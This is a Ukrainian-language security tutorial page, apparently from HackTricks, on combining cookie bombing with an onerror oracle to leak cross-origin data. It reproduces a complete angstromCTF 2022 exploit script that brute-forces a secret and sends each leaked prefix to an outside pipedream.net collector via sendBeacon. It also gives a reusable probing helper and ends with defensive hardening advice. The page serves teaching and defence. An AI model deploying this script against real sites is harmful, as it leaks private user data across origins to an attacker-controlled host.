# Cookie Bomb + Onerror XS Leak

{{#include ../../banners/hacktricks-training.md}}

This technique combines:
- Cookie bombing: набивання браузера жертви великою кількістю/великими cookie для цільового origin, так що наступні запити досягають серверних/запитних лімітів (розмір заголовків запиту, розмір URL в редиректах тощо).
- Error-event oracle: опитування крос-доменного endpoint за допомогою <script> (або іншого субресурсу) і розрізнення станів за допомогою onload vs onerror.

High level idea
- Знайти цільовий endpoint, поведінка якого відрізняється для двох станів, які ви хочете перевірити (наприклад, search “hit” vs “miss”).
- Забезпечити, щоб “hit” шлях викликав важкий ланцюжок редиректів або довгий URL, тоді як “miss” шлях залишався коротким. Роздмухати заголовки запиту за допомогою багатьох cookie так, щоб лише “hit” шлях спричиняв помилку сервера з HTTP статусом (наприклад, 431/414/400). Помилка змінює onerror подію і стає оракулом для XS-Search.

When does this work
- Ви можете змусити браузер жертви відправляти cookie до цільового сайту (наприклад, cookie мають SameSite=None або ви можете встановити їх у first-party контексті через popup window.open).
- Є фіча в застосунку, яку можна зловживати для встановлення довільних cookie (наприклад, endpoints «save preference», що перетворюють керований введенням імена/значення на Set-Cookie) або для створення post-auth редиректів, які включають дані, контрольовані атакуючим, в URL.
- Сервер реагує по-різному в двох станах і, при роздутті заголовків/URL, один стан перевищує ліміт і повертає помилку, яка викликає onerror.

Note on server errors used as the oracle
- 431 Request Header Fields Too Large часто повертається, коли cookie роздувають заголовки запиту; 414 URI Too Long або серверно-специфічний 400 можуть повернутися для довгих цільових запитів. Будь-який з цих випадків призводить до невдалого завантаження субресурсу і спрацьовування onerror. [MDN documents 431 and typical causes like excessive cookies.]()

Practical example (angstromCTF 2022)
Наступний скрипт (з публічного writeup) зловживає фічею, що дозволяє атакуючому вставляти довільні cookie, а потім завантажує крос-доменний search endpoint як скрипт. Коли запит коректний, сервер виконує редирект, який разом із cookie-bloat перевищує серверні ліміти і повертає помилковий статус, тому script.onerror спрацьовує; інакше нічого не відбувається.
```html
<>'";
<form action="https://sustenance.web.actf.co/s" method="POST">
<input id="f" /><input name="search" value="a" />
</form>
<script>
const $ = document.querySelector.bind(document)
const sleep = (ms) => new Promise((r) => setTimeout(r, ms))
let i = 0
const stuff = async (len = 3500) => {
let name = Math.random()
$("form").target = name
let w = window.open("", name)
$("#f").value = "_".repeat(len)
$("#f").name = i++
$("form").submit()
await sleep(100)
}
const isError = async (url) => {
return new Promise((r) => {
let script = document.createElement("script")
script.src = url
script.onload = () => r(false)
script.onerror = () => r(true)
document.head.appendChild(script)
})
}
const search = (query) => {
return isError(
"https://sustenance.web.actf.co/q?q=" + encodeURIComponent(query)
)
}
const alphabet =
"etoanihsrdluc_01234567890gwyfmpbkvjxqz{}ETOANIHSRDLUCGWYFMPBKVJXQZ"
const url = "//en4u1nbmyeahu.x.pipedream.net/"
let known = "actf{"
window.onload = async () => {
navigator.sendBeacon(url + "?load")
await Promise.all([stuff(), stuff(), stuff(), stuff()])
await stuff(1600)
navigator.sendBeacon(url + "?go")
while (true) {
for (let c of alphabet) {
let query = known + c
if (await search(query)) {
navigator.sendBeacon(url, query)
known += c
break
}
}
}
}
</script>
```
Навіщо спливаюче вікно (window.open)?
- Сучасні браузери дедалі частіше блокують third-party cookies. Відкриття top-level вікна до цілі робить cookies first‑party, тож Set-Cookie відповіді від цілі збережуться, що дозволяє виконати cookie-bomb step навіть за обмежень third‑party cookies.

Generic probing helper
Якщо у вас вже є спосіб встановити багато cookies на target origin (first-party), ви можете повторно використати цей мінімальний oracle проти будь-якого endpoint, чий успіх/неуспіх призводить до різних мережевих наслідків (status/MIME/redirect):
```js
function probeError(url) {
return new Promise((resolve) => {
const s = document.createElement('script');
s.src = url;
s.onload = () => resolve(false);  // loaded successfully
s.onerror = () => resolve(true);  // failed (e.g., 4xx/5xx, wrong MIME, blocked)
document.head.appendChild(s);
});
}
```
Поради щодо побудови оракула
- Зробіть «позитивний» стан важчим: додайте додаткове перенаправлення лише коли предикат істинний, або зробіть URL перенаправлення таким, що відображає необмежений користувацький ввід, щоб він зростав разом із вгадуваним префіксом.
- Inflate headers: повторюйте cookie bombing, поки на «важкій» гілці не спостерігатиметься стабільна помилка. Сервери зазвичай обмежують розмір заголовків і зазнають збою раніше, коли присутня велика кількість cookies.
- Стабілізуйте: виконайте кілька паралельних операцій встановлення cookies і опитуйте повторно, щоб усереднити шум від таймінгу та кешування.

Пов'язані трюки XS-Search
- Оракули на основі довжини URL (без cookies) можна комбінувати або використовувати замість цього, коли ви можете примусити дуже довгий цільовий запит:

{{#ref}}
url-max-length-client-side.md
{{#endref}}

Захист і зміцнення
- Зробіть відповіді про успіх/неуспіх непомітними одна від одної:
- Уникайте умовних перенаправлень або великих відмінностей у розмірі відповіді між станами. Повертайте той самий статус, той самий Content-Type і схожу довжину тіла незалежно від стану.
- Блокуйте крос-сайтові перевірки субресурсів:
- SameSite cookies: встановіть чутливі cookies як SameSite=Lax або SameSite=Strict, щоб запити субресурсів типу <script src> не несли їх; за можливості віддавайте перевагу Strict для токенів автентифікації.
- Fetch Metadata: застосовуйте Resource Isolation Policy для відхилення крос-сайтових завантажень субресурсів (наприклад, якщо Sec-Fetch-Site != same-origin/same-site).
- Cross-Origin-Resource-Policy (CORP): встановіть CORP: same-origin (або принаймні same-site) для ендпоінтів, які не повинні вбудовуватися як крос-оригін субресурси.
- X-Content-Type-Options: nosniff і правильний Content-Type на JSON/HTML кінцевих точках, щоб уникнути особливостей завантаження як скрипта.
- Зменшіть ампліфікацію заголовків/URL:
- Обмежте кількість/розмір встановлюваних cookies; санітизуйтe функції, які перетворюють довільні поля форм у Set-Cookie.
- Нормалізуйте або обрізайте відображені дані в редиректах; уникайте вставляння довгих рядків, контрольованих атакуючим, у Location URLs.
- Тримайте серверні обмеження консистентними і відповідайте однаково при помилці (уникайте спеціальних сторінок помилок тільки для однієї гілки).

Примітки
- Цей клас атак широко обговорюється як “Error Events” XS-Leaks. Крок cookie-bomb — це просто зручний спосіб змусити лише одну гілку перевищити серверні ліміти, створюючи надійний булевий оракул.

## Посилання
- XS-Leaks: Error Events (onerror/onload as an oracle): https://xsleaks.dev/docs/attacks/error-events/
- MDN: 431 Request Header Fields Too Large (common with many cookies): https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/431
{{#include ../../banners/hacktricks-training.md}}
